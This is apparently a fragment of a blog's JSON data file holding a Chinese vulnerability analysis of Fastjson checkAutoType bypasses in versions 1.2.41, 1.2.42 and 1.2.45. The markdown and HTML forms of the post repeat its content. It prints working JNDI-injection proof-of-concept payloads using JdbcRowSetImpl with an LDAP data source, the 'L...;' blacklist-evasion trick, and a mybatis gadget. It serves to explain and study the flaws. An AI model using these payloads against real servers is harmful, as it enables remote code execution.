c2540c00a101956694f1.png)\n\n从上图可见，在该方法中有两次if语句，见上图红框处\n\n从字面意义上来看，第一处的作用是匹配以”[”开头的字符串，而第二处则是匹配以”L”开头，以”;”结尾的字符串。\n\n这一点看起来与poc中的结构很相似，poc中构造的结构应该就是为这里准备的。\n\n我们接下来就来分析一下，”[”、 ”L”、”;”这些都是什么？以及为什么FastJson为什么要写两处if逻辑来处理他们。\n\n### JNI字段描述符\n\n首先我们来思考一个题外话，如何获取一个类的数组类型的Class对象？ 可参考下面demo\n\n```java\npackage AutoTypeTest;\n\nimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.parser.ParserConfig;\n\nimport java.lang.reflect.Array;\n\nclass ForTest{\n\n\n    public  String s1;\n\n    public ForTest(){\n        this.s1 =\"1\" ;\n\n    }\n\n    public String getS1() {\n        return s1;\n    }\n\n    public void setS1(String s1) {\n        this.s1 = s1;\n    }\n\n}\npublic class demo {\n    public static void main(String[] args) throws ClassNotFoundException {\n\n\n        //方法一\n        ForTest[] ar = new ForTest[1];\n        Class<?> clazz1 =  ar.getClass();\n\n        //方法二\n        Class<?> clazz2 = Array.newInstance(ForTest.class, 0).getClass();\n\n        //方法三\n        Class clazz3 = Class.forName(\"[LAutoTypeTest.ForTest;\");\n```\n\n上述demo中三种方式都可以获取一个类的数组类型的Class对象\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b9770b8f656ab3a4ebbb42e9f82e3406.png)\n\n通过调试结果可见，clazz1、clazz2、clazz3的name是一样的，都为字符串”[LAutoTypeTest.ForTest;”。\n\n”[LAutoTypeTest.ForTest;”这种形式的字符串其实是一种对函数返回值和参数的编码，名为JNI字段描述符（JavaNative Interface FieldDescriptors)。\n\nAutoTypeTest.ForTest类的Class对象名为”AutoTypeTest.ForTest”；为了区分，AutoTypeTest.ForTest类的数组类型的Class对象名则为”[LAutoTypeTest.ForTest;”这样的形式。其中首个字符”[”用以表示数组的层数，而第二个字符则代表数组的类型。\n\n这里举例说明一下JNI字段描述符的格式：\n\n- double\\[\\]\\[\\]对应的类对象名为\"[[D\"\n\n- int[]对应的类对象名则为\"[I\"\n\n- AutoTypeTest.ForTest[]对应的类对象名则为\"[LAutoTypeTest.ForTest;\"\n\n前两者比较好理解，而第三个”[LAutoTypeTest.ForTest;”，可见第二个字符是”L”,且最后一个字符是”;”。这种形式叫类描述符，”L”与”;”之间的字符串表示着该类对象的所属类（AutoTypeTest.ForTest）。这就是为什么FastJson中要有下图这样的两处if逻辑，实际上是用来解析传入的数组类型的Class对象字符串\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a5cecd42324d592731c44d90c8c21f5b.png)\n\n### 漏洞利用\n\n经过我们上文的分析，已经对漏洞以及构造有了一定的了解。接下来重点来看下FastJson解析类描述符的代码，见下图：\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/e02029eade7ee2d5a534ee7961eec2c2.png)\n\n从上图代码不难看出，当传入的类名以”L”开头，且以”;”结尾时，程序将去除首尾后返回。这意味着，如果在恶意类前后加上”L”与”;”，例如”LAutoTypeTest.ForTest;”，这样不仅可以轻易的躲避黑名单，随后在程序执行到这里时，还会将首尾附加的”L”与”;”剥去。剥皮处理之后字符串变成”AutoTypeTest.ForTest”，接着”AutoTypeTest.ForTest”被loadClass加载，恶意类被成功反序列化利用。我们构造一个如下图的poc，测验以下我们的判断是否是否正确：\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/34dd52de7e3744ab73cae88e263aca0d.png)\n\n经过动态调试后发现，程序的确进入如下if分支，并且剥去前后”L”与”;”\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/204f15e90a91f18369ab74875437598c.png)\n\n我们构造的poc执行成功。在poc执行成功后，计算器顺利的弹出\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/02c17ac61b4f3029ea2fa0635bbc2548.png)\n\n上述漏洞在Fastjson 1.2.42版本中被修复，从Fastjson 1.2.42版本发布的升级说明中可以看到这点\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/16b8d1899466896e9a2c642d0638a120.png)\n\nFastjson 1.2.42版本漏洞\n-----------------------\n\nFastjson 1.2.42版本在处理了1.2.41版本的漏洞后。很快又被发现存在着绕过方式。我们接下来分析下Fastjson 1.2.42中的checkAutotype安全机制，看看Fastjson 1.2.42的更新是怎么处理1.2.41版本漏洞的。\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/127e8ce129efb319c1a03119f550f8dc.png)\n\n从上图可以发现，不同于之前的版本，程序并不是直接通过明文的方式来匹配黑白名单，而是采用了一定的加密混淆。此时的黑名单也变成如下的样子\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/f796a6f9ed3d05d3f7f4e41c4df4a283.png)\n\n针对这里的黑名单的原文明文也是有人曾经研究过的，可以参考如下链接\n\nhttps://github.com/LeadroyaL/fastjson-blacklist\n\n除了引入了黑名单加密混淆机制外，checkAutotype中也加入了一些新的机制，如下图这里\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b8159ba031debf45a5a98c088f859ea8.png)\n\n与之前的版本相比，这里多出了上图这一段代码。从代码上大体可以猜测出来，这是用来判断类名的第一个字符与最后一个字符是否满足一定条件，然后将首尾剥去。这里又看到熟悉的剥皮操作了，我们不难猜测到这两个满足条件的字符大概率是”L”与”;”。开发者的用意大概是想针对于1.2.41版本的利用”Lcom.sun.rowset.JdbcRowSetImpl;”，先剥去传入类名首尾的”L”与”;”，以便将恶意数据暴露出来，再经过黑名单校验。\n\n我们写个小测试，看看这俩字符是不是”L”与”;”\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/0a1d4125f31b560b3d2cfcddd0bcbaf9.png)\n\n实践证明，FastJson这里要去除的还真是首尾的”L”与”;”\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/6298aa075e5553217bd7f5042c484f3e.png)\n\n### 漏洞利用\n\n因为这里很容易猜出怎么绕过，因此我们先不贴poc，一步步分析下执行流程最终构造处正确的poc。\n\n首先程序进入checkAutoType后，进入如下两个if分支进行处理\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/ac1453b99590452916dd6336ef14c1ba.png)\n\n第一个if分支，是用来限制传入的类名长度的，这里只要我们传入的poc中类名长度在3与128之间即可。而第二个分支，我们上文已经分析过了，目的是剥去类名中的首尾”L”与”;”。因此构造如下poc即可轻易绕过FastJson1.2.42版本\n\n```java\n        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);\n        String jsonstr = \"{\\\"@type\\\":\\\"Lcom.sun.rowset.JdbcRowSetImpl;\\\",\\\"dataSourceName\\\":\\\"ldap://localhost:1389/ExecTest\\\",\" + \" \\\"autoCommit\\\":true}\";\n        Object obj = JSON.parseObject(jsonstr);\n        System.out.println(obj);\n```\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d1f0ba0089fc7f64635cbd52afe5350c.png)\n\nFastjson 1.2.45版本漏洞\n-----------------------\n\n在Fastjson 1.2.45版本中，checkAutotype安全机制又被发现了一种绕过方式。之前的几次绕过都是针对checkAutoType的绕过，而这次则是利用了一条黑名单中不包含的元素，从而绕过了黑名单限制。\n\n本次绕过利用到的是mybatis库。如果想测试成功，需要额外安装mybatis库。下文测试用例中安装的版本是3.5.5。\n\n首先简单介绍下mybatis，maven上的简介如下：\n\n> “MyBatis SQL映射器框架使将关系数据库与面向对象的应用程序结合使用变得更加容易。MyBatis使用XML描述符或注释将对象与存储过程或SQL语句耦合。相对于对象关系映射工具，简单性是MyBatis数据映射器的最大优势。”\n\n### 漏洞利用\n\n本次利用poc如下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/23689542db1576061ec011f3d10ca794.png)\n\n从poc中不难发现，@type指定了JndiDataSourceFactory类，而在properties属性中的data_source变量中指定恶意数据源。由于JndiDataSourceFactory并不在黑名单上，因此可以顺利通过黑名单校验，在接下来的反序列化过程中，在为Properties变量赋值时调用其setter方法，可见下图动态调试结果\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/8bf6a23d27b5eca427263eee78bb4b71.png)\n\n在上图setProperties方法中，程序将取出poc中构造的DATA_SOURCE值并触发漏洞\n\n写在最后\n--------\n\n除了上文分析的漏洞之外，FastJson还有几个很精彩的漏洞，例如Fastjson 1.2.47版本和1.2.68版本的漏洞。因为篇幅有限，要写的实在太多了，因此我把它们抽出来放在后续文章中介绍。","slug":"fastjsonsecurity1","published":1,"updated":"2020-10-27T09:25:29.365Z","_id":"ckgrozu9c003cwsa9cx6k7vvc","comments":1,"layout":"post","photos":[],"link":"","content":"<p>本文衔接上一篇文章<a href=\"http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/\">《Fastjson 1.2.24反序列化漏洞深度分析》</a>，继续探讨一下FastJson的历史漏洞。</p>\n<p>在《Fastjson 1.2.24反序列化漏洞深度分析》一文中，我们以Fastjson 1.2.24反序列化漏洞为基础，详细分析fastjson漏洞的一些细节问题。</p>\n<p>Fastjson 1.2.24 版本的远程代码执行漏洞可谓是开辟了近几年来Fastjson漏洞的纪元。在Fastjson 1.2.24版本反序列化漏洞初次披露之后，官方针对这个漏洞进行了修补。然而这个修复方案很快就被发现存在绕过的风险。由于官方的修复方案或多或少都存在着一些问题，随之而来的是一次又一次的绕过与修复。</p>\n<p>回顾一下Fastjson反序列化漏洞，简单来说就是：fastjson通过parse、parseObject处理以json结构传入的类的字符串形时，会默认调用该类的共有setter与构造函数，并在合适的触发条件下调用该类的getter方法。当传入的类中setter、getter方法中存在利用点时，攻击者就可以通过传入可控的类的成员变量进行攻击利用。com.sun.rowset.JdbcRowSetImpl这条利用链用到的是类中setter方法的缺陷，而TemplatesImpl利用链则用到的是getter方法缺陷。</p>\n<p>官方主要的修复方案是引入了checkAutotype安全机制，通过黑白名单机制进行防御。在随后的版本中，为了增强漏洞绕过的难度，又在checkAutotype中采用了一定的加密混淆将本来明文存储的黑名单进行加密。</p>\n<p>在简单的介绍完Fastjson 1.2.24版本远程代码执行漏洞后，我们来看一下官方是怎么修复这个漏洞的。</p>\n<h2 id=\"checkAutotype安全机制\"><a href=\"#checkAutotype安全机制\" class=\"headerlink\" title=\"checkAutotype安全机制\"></a>checkAutotype安全机制</h2><p>Fastjson从1.2.25开始引入了checkAutotype安全机制，通过黑名单+白名单机制来防御。我们先来看一下1.2.25版本初次引入的checkAutotype安全机制的形式，首先来看几个示例</p>\n<ol>\n<li>示例一</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> AutoTypeTest;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ForTest</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span>  String s1;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">getS1</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> s1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setS1</span><span class=\"params\">(String s1)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.s1 = s1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">demo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;AutoTypeTest.ForTest\\&quot;,\\&quot;s1\\&quot;:\\&quot;1\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        Object obj = JSON.parseObject(jsonstr);</span><br><span class=\"line\">        System.out.println(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这是一个很普通的测试样例，用来将字符串转变为Java对象。执行结果如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/3d7f965f988e8e297889dc6d75d8f4b6.png\"></p>\n<p>这个测试样例在1.2.24版本是可以执行成功的，但在1.2.25版本中却爆出来autoType is not support错误。</p>\n<p>这是因为Fastjson 1.2.25版本引入了checkAutotype安全机制。在默认情况下AutoTypeSupport关闭且测试样例中的AutoTypeTest.ForTest类虽然不在黑名单上，但也并不在checkAutotype安全机制白名单上，因此使用上图测试样例在Fastjson 1.2.25版本中反序列化失败。</p>\n<ol start=\"2\">\n<li>示例二</li>\n</ol>\n<p>在这个示例中，我们将AutoTypeSupport设置为true</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">demo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;AutoTypeTest.ForTest\\&quot;,\\&quot;s1\\&quot;:\\&quot;1\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        Object obj = JSON.parseObject(jsonstr);</span><br><span class=\"line\">        System.out.println(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在开启AutoTypeSupport后，AutoTypeTest.ForTest类反序列化成功</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/81f432dbf98c947a76eab4f798339a02.png\"></p>\n<ol start=\"3\">\n<li>示例三</li>\n</ol>\n<p>这一次换成恶意类，再进行一次实验</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">demo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/ExecTest\\&quot;,&quot;</span> + <span class=\"string\">&quot; \\&quot;autoCommit\\&quot;:true&#125;&quot;</span>;</span><br><span class=\"line\">        Object obj = JSON.parseObject(jsonstr);</span><br><span class=\"line\">        System.out.println(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>动态调试一下经过动态调试可以发现，程序在执行到com/alibaba/fastjson/parser/ParserConfig.java中checkAutoType安全机制时，com.sun.rowset.JdbcRowSetImpl类会触发黑名单，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/19d24d1278cfdd136f09593ad29112a1.png\"></p>\n<p>程序将抛出错误</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5a0becd8ef816df3112cd1d90d1c76aa.png\"></p>\n<p>我们来看一下Fastjson 1.2.25版本中引入的黑名单中元素都有哪些，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/0cb5a1002338e425a9dffb00b927d908.png\"></p>\n<p>这次实验中的poc无法成功利用，是因为com.sun.rowset.JdbcRowSetImpl类命中了黑名单而不能反序列化成功。</p>\n<p>在这里额外介绍一下：当程序经过黑白名单的校验之后，接下来会通过TypeUtils.loadClass方法对类进行反序列化加载</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b32c6fa1b3e8dde52ccf4b6b198dfea6.png\"></p>\n<p>TypeUtils.loadClass方法的实现比较有意思，下文要介绍的几处漏洞也与之有关。</p>\n<h2 id=\"Fastjson-1-2-41版本漏洞\"><a href=\"#Fastjson-1-2-41版本漏洞\" class=\"headerlink\" title=\"Fastjson 1.2.41版本漏洞\"></a>Fastjson 1.2.41版本漏洞</h2><p>1.2.41版本漏洞利用，其实就是针对1.2.24版本漏洞所打的补丁的绕过，本次漏洞影响了1.2.41版本以及之前的版本</p>\n<p>首先来看一下1.2.41版本漏洞利用的poc</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/34dd52de7e3744ab73cae88e263aca0d.png\"></p>\n<p>可以发现，@type字段值为”Lcom.sun.rowset.JdbcRowSetImpl;”</p>\n<p>在”com.sun.rowset.JdbcRowSetImpl”类的首尾多出了一个L与;</p>\n<p>经过上文的介绍，我们知道@type字段值会经过黑名单校验</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/0cb5a1002338e425a9dffb00b927d908.png\"></p>\n<p>黑名单的检测机制很简单，就是用黑名单中的元素依次与@type字段值进行字符串匹配，从@type字段值从首位开始，匹配到了黑名单中的元素，就会抛出错误。</p>\n<p>很明显，”Lcom.sun.rowset.JdbcRowSetImpl;”并不会匹配到黑名单。但是有一个问题：黑名单匹配机制明显不管@type字段值末位是什么，又是为何在末位加一个”;”呢？首位的”L”又是什么呢？我们随后会介绍一下这个。</p>\n<p>通过上文对checkAutotype安全机制的解释可以发现，@type字段值首先会经过黑白名单的校验。在成功通过校验之后，程序接下来会通过TypeUtils.loadClass方法对类进行加载</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b32c6fa1b3e8dde52ccf4b6b198dfea6.png\"></p>\n<p>让我们来跟入位于com/alibaba/fastjson/util/TypeUtils.java中的loadClass方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/905ad768dd7cc2540c00a101956694f1.png\"></p>\n<p>从上图可见，在该方法中有两次if语句，见上图红框处</p>\n<p>从字面意义上来看，第一处的作用是匹配以”[”开头的字符串，而第二处则是匹配以”L”开头，以”;”结尾的字符串。</p>\n<p>这一点看起来与poc中的结构很相似，poc中构造的结构应该就是为这里准备的。</p>\n<p>我们接下来就来分析一下，”[”、 ”L”、”;”这些都是什么？以及为什么FastJson为什么要写两处if逻辑来处理他们。</p>\n<h3 id=\"JNI字段描述符\"><a href=\"#JNI字段描述符\" class=\"headerlink\" title=\"JNI字段描述符\"></a>JNI字段描述符</h3><p>首先我们来思考一个题外话，如何获取一个类的数组类型的Class对象？ 可参考下面demo</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> AutoTypeTest;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Array;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ForTest</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span>  String s1;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ForTest</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.s1 =<span class=\"string\">&quot;1&quot;</span> ;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">getS1</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> s1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setS1</span><span class=\"params\">(String s1)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.s1 = s1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">demo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> ClassNotFoundException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//方法一</span></span><br><span class=\"line\">        ForTest[] ar = <span class=\"keyword\">new</span> ForTest[<span class=\"number\">1</span>];</span><br><span class=\"line\">        Class&lt;?&gt; clazz1 =  ar.getClass();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//方法二</span></span><br><span class=\"line\">        Class&lt;?&gt; clazz2 = Array.newInstance(ForTest.class, <span class=\"number\">0</span>).getClass();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//方法三</span></span><br><span class=\"line\">        Class clazz3 = Class.forName(<span class=\"string\">&quot;[LAutoTypeTest.ForTest;&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>上述demo中三种方式都可以获取一个类的数组类型的Class对象</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b9770b8f656ab3a4ebbb42e9f82e3406.png\"></p>\n<p>通过调试结果可见，clazz1、clazz2、clazz3的name是一样的，都为字符串”[LAutoTypeTest.ForTest;”。</p>\n<p>”[LAutoTypeTest.ForTest;”这种形式的字符串其实是一种对函数返回值和参数的编码，名为JNI字段描述符（JavaNative Interface FieldDescriptors)。</p>\n<p>AutoTypeTest.ForTest类的Class对象名为”AutoTypeTest.ForTest”；为了区分，AutoTypeTest.ForTest类的数组类型的Class对象名则为”[LAutoTypeTest.ForTest;”这样的形式。其中首个字符”[”用以表示数组的层数，而第二个字符则代表数组的类型。</p>\n<p>这里举例说明一下JNI字段描述符的格式：</p>\n<ul>\n<li><p>double[][]对应的类对象名为”[[D”</p>\n</li>\n<li><p>int[]对应的类对象名则为”[I”</p>\n</li>\n<li><p>AutoTypeTest.ForTest[]对应的类对象名则为”[LAutoTypeTest.ForTest;”</p>\n</li>\n</ul>\n<p>前两者比较好理解，而第三个”[LAutoTypeTest.ForTest;”，可见第二个字符是”L”,且最后一个字符是”;”。这种形式叫类描述符，”L”与”;”之间的字符串表示着该类对象的所属类（AutoTypeTest.ForTest）。这就是为什么FastJson中要有下图这样的两处if逻辑，实际上是用来解析传入的数组类型的Class对象字符串</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a5cecd42324d592731c44d90c8c21f5b.png\"></p>\n<h3 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><p>经过我们上文的分析，已经对漏洞以及构造有了一定的了解。接下来重点来看下FastJson解析类描述符的代码，见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/e02029eade7ee2d5a534ee7961eec2c2.png\"></p>\n<p>从上图代码不难看出，当传入的类名以”L”开头，且以”;”结尾时，程序将去除首尾后返回。这意味着，如果在恶意类前后加上”L”与”;”，例如”LAutoTypeTest.ForTest;”，这样不仅可以轻易的躲避黑名单，随后在程序执行到这里时，还会将首尾附加的”L”与”;”剥去。剥皮处理之后字符串变成”AutoTypeTest.ForTest”，接着”AutoTypeTest.ForTest”被loadClass加载，恶意类被成功反序列化利用。我们构造一个如下图的poc，测验以下我们的判断是否是否正确：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/34dd52de7e3744ab73cae88e263aca0d.png\"></p>\n<p>经过动态调试后发现，程序的确进入如下if分支，并且剥去前后”L”与”;”</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/204f15e90a91f18369ab74875437598c.png\"></p>\n<p>我们构造的poc执行成功。在poc执行成功后，计算器顺利的弹出</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/02c17ac61b4f3029ea2fa0635bbc2548.png\"></p>\n<p>上述漏洞在Fastjson 1.2.42版本中被修复，从Fastjson 1.2.42版本发布的升级说明中可以看到这点</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/16b8d1899466896e9a2c642d0638a120.png\"></p>\n<h2 id=\"Fastjson-1-2-42版本漏洞\"><a href=\"#Fastjson-1-2-42版本漏洞\" class=\"headerlink\" title=\"Fastjson 1.2.42版本漏洞\"></a>Fastjson 1.2.42版本漏洞</h2><p>Fastjson 1.2.42版本在处理了1.2.41版本的漏洞后。很快又被发现存在着绕过方式。我们接下来分析下Fastjson 1.2.42中的checkAutotype安全机制，看看Fastjson 1.2.42的更新是怎么处理1.2.41版本漏洞的。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/127e8ce129efb319c1a03119f550f8dc.png\"></p>\n<p>从上图可以发现，不同于之前的版本，程序并不是直接通过明文的方式来匹配黑白名单，而是采用了一定的加密混淆。此时的黑名单也变成如下的样子</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/f796a6f9ed3d05d3f7f4e41c4df4a283.png\"></p>\n<p>针对这里的黑名单的原文明文也是有人曾经研究过的，可以参考如下链接</p>\n<p><a 